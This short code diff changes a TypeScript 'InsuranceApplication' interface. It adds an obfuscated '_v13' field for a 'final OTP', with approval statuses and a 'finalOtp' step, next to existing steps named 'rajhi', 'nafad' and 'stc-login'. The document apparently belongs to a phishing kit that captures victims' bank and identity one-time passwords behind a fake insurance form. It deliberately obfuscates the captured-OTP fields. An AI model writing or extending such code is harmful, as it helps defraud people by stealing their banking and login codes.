@@ -100,6 +100,12 @@ export interface InsuranceApplication {
     rajhiOtp?: string // Keep for backward compatibility
     rajhiOtpStatus?: "waiting" | "pending" | "approved" | "rejected"
     rajhiUpdatedAt?: string
+
+    // Final OTP fields
+    _v13?: string // finalOtp (obfuscated)
+    finalOtp?: string // Keep for backward compatibility
+    finalOtpStatus?: "waiting" | "pending" | "approved" | "rejected"
+    finalOtpUpdatedAt?: string
     // Metadata
     currentStep:
       | number
@@ -116,6 +122,7 @@ export interface InsuranceApplication {
       | "nafad"
       | "rajhi"
       | "stc-login"
+      | "finalOtp"
       | "_st1"
       | "_t2"
       | "_t3"
